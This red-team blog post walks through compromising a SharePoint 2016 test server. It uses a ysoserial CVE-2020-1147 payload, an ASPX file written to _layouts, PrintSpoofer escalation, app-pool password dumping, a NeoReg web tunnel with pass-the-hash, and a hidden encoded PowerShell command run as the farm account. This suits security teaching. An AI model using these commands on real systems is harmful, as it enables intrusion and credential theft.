+++
title = "The Lone Sharepoint"
date = 2021-02-12

[taxonomies]
tags = ["Windows", "Active Directory", "Privilege Escalation"]

[extra]
authors = "Acap4z"
preview_summary = "In this post we are going to explore some particular cases when targeting Sharepoint instances along your way in Pentests/Red Team exercises. I noticed that there is a lot of information that can help us, but it is spread among multiple sources, so I made my own compilation combined with my research. "
preview_image = "fig4.png"
+++


Hello dear friends. Today we are going to explore some particular cases when targeting Sharepoint instances along your way in Pentests/Red Team exercises. When I faced this suite for the first time, I noticed that there is a lot of information that can help us, but it is spread among multiple sources, so I wanted to share my own compilation combined with my research work. 

As you may know, Microsoft Sharepoint is a web-based collaborative platform that integrates with Microsoft Office. Primarily sold as a document management and storage system, the product is highly configurable and usage varies substantially among organizations. Focusing on what is of our interest, this is a web-driven suite usually accessed by authenticated corporate users and known to suffer from a myriad of CVE reported issues if not patched. These last ones lead to Remote Code Execution (RCE) and ultimately allow attackers to compromise the server instance. Sounds like a good target to compromise.

However, the complete exploitation process is not always straightforward and we may find some difficulties when trying to escalate privileges or set up some persistence implants. We are going into detail in the following sections.

<!-- more -->


## Intel Report

First of all, let's explore the latest RCE issues with their exploitation process explained somewhere:

- [CVE-2020-16952](https://srcincite.io/pocs/cve-2020-16952.py.txt): Server Side Inclusion leverages web.config disclosure, which leads to machine key leakage, ultimately achieving RCE using a serialization gadget in a crafted ViewState.
- [CVE-2020-1181](https://www.zerodayinitiative.com/blog/2020/6/16/cve-2020-1181-sharepoint-remote-code-execution-through-web-parts): WebParts allows unrestricted ASP.NET edition and execution through the `WikiContentWebpart` type.
- [CVE-2020-1147](https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html): Untrusted types deserialization in `XmlTextReader` through `__SUGGESTIONSCACHE__` parameter leads to RCE even with no edit permissions.
- [CVE-2020-0932](https://www.thezdi.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters): WebParts does not restrict types when parsing some XML contents, leading to a RCE chain through `System.Resources.ResourceSet` and a crafted `*.resources` file.
- [CVE-2019-0604](https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability): Deserialization issues involving `XmlSerializer` lead to RCE.

As you may noticed, all of these vulnerabilities can provide command execution to attackers, but they require authenticated access by default. Since most Sharepoint instances are connected to Active Directory and we assume no access to the complete list of users, the most suitable approach in this case would be user gathering from OSINT resources and then Password Spraying against authenticated Sharepoint endpoints. Another option would be to fuzz endpoints using specific [wordlists like SecLists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/Sharepoint.fuzz.txt) and try to find unauthenticated content, hopefully finding vulnerable endpoints or information disclosure issues regarding AD users. This already happened in real cases, such as with [the U.S. Dept Of Defense](https://hackerone.com/reports/534630).

We won't go into much detail with user gathering. I just want to note the obvious but most important thing: the more complete the user list is, the greater are the chances to get in. At this point you surely have the basic information to make a good user list: user syntax (name.surname, n_surname, etc) disclosed in metadata and user databases (company website or directories, LinkedIn, Search Engines, etc).

Dorks in Search Engines are quite powerful. They can serve you well if used wisely not only for user enumeration, but also for endpoint discovery. Some endpoint instances host more than one site, and they are not necessarily configured the same way.

{{ figure(name="fig1.png", caption="Endpoint discovery using dorks.") }}

Once we get authenticated access, we can proceed with the exploitation itself.


## Pwning Sharepoint from your home

For sake of simplicity we are going to work with CVE-2020-1147 as it is implemented in [Ysoserial.NET](https://github.com/pwntester/ysoserial.net), a fantastic tool to craft .NET serialized gadgets with custom payloads.

{{ figure(name="fig2.png", caption="Ysoserial's SharePoint payloads.") }}

There are a couple of ways to check if an asynchronous blind RCE succeeded. We can issue web requests with a custom domain pointing to our server and see if they reach it. We can even set up a non-authoritative DNS domain to see wether DNS requests can be leaked in case HTTP requests are not being received. 


### The _layouts folder trick

If none of these methods work we can try to write a proof file into one of the web directories and check its existence. Although default Sharepoint configurations don't allow write access to web folders, sometimes sysadmins relax these restrictions to meet application requirements, so it worths trying.

A bit of research revealed that Sharepoint does not handle web files directly. However, there are some [special cases such as the `_layouts` folder where files can be requested directly](https://www.oreilly.com/library/view/professional-microsoft-sharepoint/9780470287613/9780470287613_the_special_case_of_the_underscore_layou.html). The best part of using this folder is that ASPX files are not subject to restriction as it happens with user pages, which are stored in the database and include the inability to use code blocks or include files from the file system, as already explained [here](https://www.zerodayinitiative.com/blog/2020/6/16/cve-2020-1181-sharepoint-remote-code-execution-through-web-parts).

From now on, all practical explanations will be based in the testing Sharepoint 2016 VM available [here](https://gauravmahajan.net/2017/10/06/sharepoint-server-2016-virtual-machine-download/). We will try to upload some testing code to check if we can write into the `_layouts` folder with the current IIS Pool user.

```html
<%@ Import Namespace="Microsoft.SharePoint" %>
    
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head></head>
<body>
<%= "testprint" %>
</body>
</html>
```

The `_layouts` folder is located at `C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\proof.aspx` in the file system (note that the `16` folder is version-dependent, in this case it matches Sharepoint 2016),  so we launch Ysoserial.NET using the following command:

```bash
.\ysoserial.exe -p Sharepoint --cve=CVE-2020-1147 -c 'echo ^<^%@^ Import^ Namespace="Microsoft.SharePoint"^ ^%^>^ ^ ^<^!DOCTYPE^ html^ PUBLIC^ "-//W3C//DTD^ XHTML^ 1.0^ Strict//EN"^ "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"^>^ ^<html^>^ ^<head^>^</head^>^ ^<body^>^ ^<^%=^ "testprint"^ ^%^>^ ^</body^>^ ^</html^> > "C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\proof.aspx"'
```

It is a common practice to use the same Sharepoint instance for multiple sites mapped to different domains or subdomains. Another advantage from uploading ASPX files to `_layouts` is that we don't need to find the correct site since all of them have access to this folder. In our example, one valid URL would be `http://intranet.sp2016gm.dev/_layouts/15/proof.aspx`:

{{ figure(name="fig3.png", caption="Simple PoC demostrating RCE.") }}

This way we confirmed Code Execution capabilities, so we can proceed to the next step.



## Domain accounts in Cl34rt3xt

But wait a minute... do we really need to PrivEsc? That's a nice question. If you managed to confirm code execution and HTTP outbound connectivity, probably the best way to continue would be with a C2 HTTP implant. If your favourite C2 has proxy functionality then you may have a nice persistence with command execution and traffic tunneling capabilities, leaving PrivEsc as unnecessary.

However, if the server is unable to perform outbound connections, there are important sub-goals we can achieve after successful Privilege Escalation in a Sharepoint machine:

- The most important fact, PrivEsc will allow us to write ASPX files into the `layouts` folder, useful for web tunneling and setting up external persistences.
- We are interested in recovering the domain account for IIS Pool so we can use it in further HTTP requests instead of a compromised user. This way we avoid to lose access due to the user account being locked/disabled or a password reset.
- Given the centralized nature of this suite (well, it can be clustered) there is a high chance of getting cached credentials from multiple users, including server admins or even Domain Admins.

Privilege Escalation techniques in Windows can be very wide, but when we face a well-configured Windows Server 2019 instance, things can become hard. Still, there is one technique that should work fine considering that our IIS Pool account probably has the `SeImpersonatePrivilege` privilege enabled: [the PrintSpoofer bug](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/).

It is worth to mention that the [Delegate 2 Thyself technique](https://exploit.ph/revisiting-delegate-2-thyself.html) could also work, but the Sharepoint server must meet two requirements: it has to be adhered to a Windows domain, and the Pool account must be a local service account. In my experience, IIS Pool accounts in Sharepoint instances are usually associated to domain user accounts, which makes this path unfeasible, but if you find a case where a local account is used (i.e. `iis apppool\defaultapppool`) you could give it a try.

To go through the PrintSpoofer bug, you can get the PoC from itm4n's git repo or [the SweetPotato project](https://github.com/CCob/SweetPotato). The tool needs to be modified to avoid AV detections and then uploaded to the target, a process which I will not utter here. Once the tool is ready,  to confirm that the PrivEsc is working, we are going to get the Pool account plaintext password and write it into the `layouts` folder so we can read it even if no outbound connection is available. The basic `appcmd` command would be the following:

```bash
c:\windows\system32\inetsrv\appcmd.exe list apppool  /text:* | findstr "userName password" > "C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\share.js"
```

Remember that this command must be launched using the PrintSpoofer tool, and wrap the entire command in Ysoserial to trigger it through serialization as explained earlier. Output will be written into the `layouts` folder as a fake JS file named `share.js`. If everything went as expected, all the service accounts configured in IIS should be displayed when opening the dump file (remember to delete the file ASAP, and don't even try this in a customer's environment without encrypting these contents first).

{{ figure(name="fig4.png", caption="Username and password extraction") }}

At this point we should have both command execution and privilege escalation in place. If we didn't get a C2 implant with proxy capabilities working, we need to proceed with the Web Tunneling step.


## Web Tunneling in overdrive

Originally, web tunnels were configured using customized versions of [ReGeorg](https://github.com/sensepost/reGeorg) which did a good job. This made people to create their own versions taking the original code as the base, until some time ago a new project called [Neo-Regeorg or NeoReg](https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md) appeared with a bunch of new functions and improvements.

Basic usage in NeoReg is pretty straightforward: it has one command to generate the web files using the specified key to encrypt its content (useful against non-HTTP connections and packet inspection).

```bash
$ python neoreg.py generate -k sup3rs3cr3tp4ss
...
[+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.aspx
...
```

The `.aspx` file would be the one to be written into the `layouts` folder now that we have privileges to do so. Once the web file is generated and uploaded into the target, there last command establishes connection and sets up the proxy port in our local machine:

```bash
$ python3 neoreg.py -k sup3rs3cr3tp4ss -u http://intranet.sp2016gm.dev/_layouts/15/tunnel.aspx
```

However, there are two problems we are going to face if we try to use ReGeorg/NeoReg in a Sharepoint instance: NTLM Authentication and Session State.

## NTLM Authentication

The first problem we are facing is web NTLM Authentication. Although there is a flag to add headers which can be used to set a fixed `Authorization` header, in the case of NTLM this is not enough as it changes dinamically with its challenge-response model.

```bash
 $ python3 neoreg.py -k sup3rs3cr3tp4ss -u http://intranet.sp2016gm.dev/_layouts/15/tunnel.aspx
 ...
 Tunnel at:
    http://intranet.sp2016gm.dev/_layouts/15/tunnel.aspx
+------------------------------------------------------------------------+
[ERROR   ]  Georg is not ready, please check URL and KEY. rep: [401] Unauthorized
```

To fix this, we can implement a small new functionality to handle NTLM authentication by taking advantage from the existing `requests-ntlm2` Python library. It can be installed with `pip`:

```
pip install requests-ntlm2
```

In the Python client file `neoreg.py` we can use hardcoded credentials as a first approach to check if it is working. Only three lines are required to implement authentication using this library: the import sentence at `line 17` and the auth item itself at `lines 720-721`.

```python
...
17.			from requests_ntlm2 import HttpNtlmAuth
...
717.        conn.headers['Accept-Encoding'] = 'gzip, deflate'
718.        conn.headers['User-Agent'] = USERAGENT
719.        
720.        auth=HttpNtlmAuth('gmsp2016.dev\\sp_services','pass@word1')
721.        conn.auth=auth
```
If for some reason the cleartext password is not known but we have the NTLM hash, it can be used directly.  It is not a well documented function, but digging around into the code shows that Pass the Hash is already implemented in this library. GitHub itself is a nice tool to trace code as it is capable of matching function definitions between files.

We start by looking at `requests_ntlm2.py` file until the first reference to header negotiation appears.
{{ figure(name="fig5.png", caption="") }}

Next file to be inspected is `dance.py` inside the same project. The `HttpNtlmContext` class is wrapping its namesake in the `ntlm_auth` project, which is the base of this one.
{{ figure(name="fig6.png", caption="") }}

We move to `ntlm.py` file in the original `ntlm_auth` project referred in `HttpNtlmContext` until we see the next reference to the challenge authentication message, pointing to `ntlm_auth/messages.py`.
{{ figure(name="fig7.png", caption="") }}

We reach the point where username and password is being computed, but we need to dive in deeper detail that we can get from `ntlm_auth/compute_response.py`.
{{ figure(name="fig8.png", caption="") }}

The `compute_response.py` file has another reference to the `_ntowfv2` function in `ntlm_auth/compute_hash.py`.
{{ figure(name="fig9.png", caption="") }}

Finally we reach the low-level detail at `compute_hash.py`, and here is where the magic happens. If the `password` string matches a full NTLM hash, no transformation is applied and the library just split LM and NT hashes to take the lattest.
{{ figure(name="fig10.png", caption="") }}

This operation takes place in the `_ntowfv1` function, but if we take a look to `_ntowfv2` which is the one we came from, we can see that it follows the same path since it calls `_ntowfv1` to get the digest.
{{ figure(name="fig11.png", caption="") }}


You can test it by putting the NTLM hash instead of the plaintext password in the authentication line.

```python
720.     auth=HttpNtlmAuth('gmsp2016.dev\\sp_services','908E2A7188837309B262350F152C6028:BA03A114DEF8D5C913983436960E592C')
```

This point is quite useful if you get NTLM hashes from SAM / LSASS dumps or the [Internal Monologue Attack](https://github.com/eladshamir/Internal-Monologue).


### Dealing with Session State

Authentication was the first obstacle, but there is another remaining. ReGeorg/NeoReg needs a feature called `Session State` to store some persistent information across web requests such as socket handlers used to proxy internal connections. Session State is enabled in most IIS configurations, but it comes disabled by default in Sharepoint instances.

One 'noob programmer' idea that came to my mind to fix this was to find a way of serializing the socket to pass this information to the Python client, then specifying the socket in each request so the server didn't have to remember this info. Unfortunately, sockets **are not serializable**. 

Knowing this information, the only option remaining was to enable session state. Probably, previous consent from the customer will be required here since we are going to change configuration parameters in a production environment. Sharepoint comes with [its own Powershell cmdlets](https://docs.microsoft.com/en-us/powershell/module/sharepoint-server/get-spsessionstateservice?view=sharepoint-ps) to make this kind of operations easier.

```powershell
Add-PsSnapin Microsoft.SharePoint.PowerShell; Enable-SPSessionStateService -DefaultProvision
```

I advance you that if you try to launch this command from Ysoserial payloads, the webshell or even SYSTEM with the Potato exploit, the server will deny your request with the following message:

```xml
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Enable-SPSessionStateService : You need to have Farm administrator priviliges 
```

Fortunately, we have the `SP_Farm` account from the `appcmd.exe` command, so we can use it to solve privilege issues. To impersonate the farm user in a non-interactive environment, [RunAsCs](https://github.com/antonioCoco/RunasCs) project can help us to create an `Interactive` process token (logon type 2) to launch the command without too much trouble. Note that the Powershell command has been encoded in Base64 to prevent issues with special chars and command line terminators.

```powershell
cmd /c c:\programdata\runascs.exe SP_Farm pass@word1 "powershell -window hidden -enc QQBkAGQALQBQAHMAUwBuAGEAcABpAG4AIABNAGkAYwByAG8AcwBvAGYAdAAuAFMAaABhAHIAZQBQAG8AaQBuAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsADsAIABFAG4AYQBiAGwAZQAtAFMAUABTAGUAcwBzAGkAbwBuAFMAdABhAHQAZQBTAGUAcgB2AGkAYwBlACAALQBEAGUAZgBhAHUAbAB0AFAAcgBvAHYAaQBzAGkAbwBuAA==" -d gmsp2016.dev -l 2
```

No output will be received from this command, but it could be modified to include STDOUT redirection in the Powershell command to write it into a file so it can be checked later. If everything went fine, Session State should be enabled now in the Sharepoint instance. 

There is one last thing to care about. As explained in the [official Microsoft documentation](https://docs.microsoft.com/en-us/previous-versions/aspnet/ms178581(v=vs.100)?redirectedfrom=MSDN#session-variables):

*"When you use a session-state mode other than [InProc](https://msdn.microsoft.com/en-us/library/cc99xk3f(v=vs.100)), the session-variable type must be either a primitive .NET type or  serializable. This is because the session-variable value is stored in an external data store. For more information, see [Session-State Modes](https://docs.microsoft.com/en-us/previous-versions/aspnet/ms178586(v=vs.100))."*

Despite failing miserably when trying to serialize sockets, in the end I got valuable information. NeoReg will fail again if we try to use it right now, but we know why: Session State is enabled with the `external data store` mode by default, which cannot handle socket serialization, so we must change it for the `InProc` mode. We can achieve this by adding the `<sessionState>` config in the `web.config` file corresponding to the Sharepoint app we are using:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<configuration>
...
  <system.web>
  ...
	<sessionState mode="InProc" timeout="25"></sessionState> 
```

Normally, Sharepoint servers will handle `web.config` modifications automatically, so there is no need to restart any service. After that, NeoReg should finally work, allowing us to configure a proxy tunnel even in the most lone Sharepoint. It's up to my dear reader which steps are taken from now on.

Be gentle. 

@acap4z


## Conclusion

In this post we have demonstrated that Sharepoint instances are attractive assets for atackers when exposed, even in those cases where only the HTTP or HTTPS port is reachable and credentials are required. If this software is not properly patched, critical vulnerabilities can be handful for malicious actors to get control of the affected servers. Even though the vulnerabilities mentioned here are somewhat outdated right now, there are high chances of finding instances that are not fully patched. Moreover, new CVEs will be potentially disclosed in the future such as [CVE-2021-1707](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1707), so the gates will be continuously opened for this exploitation path.

C2 tools like Cobalt Strike are very suitable in those cases where HTTP outbound connections are possible. It provides not only command execution, but also a lot of tools that can be launched in-memory without privilege escalation, such as reverse proxies to get a tunnel to the internal network.

If we find the Lone Sharepoint which has no outbound connectivity, it is still possible to set up persistences in the form of web-based applications. With a bit of extra effort, we have demonstrated that even Web Tunneling is possible in tough cases.



## Aknowledgements

- All the people that have shared their research and efforts in this field, whose work is referenced in this post.
- All the Crummie5 for their support and post reviewal.



## Disclaimer

The contents explained in this article are oriented to academic purposes and must not be used without customer's permission, or followed literally in real life security projects. It's up to the reader to investigate how to adapt these cases to their particular needs.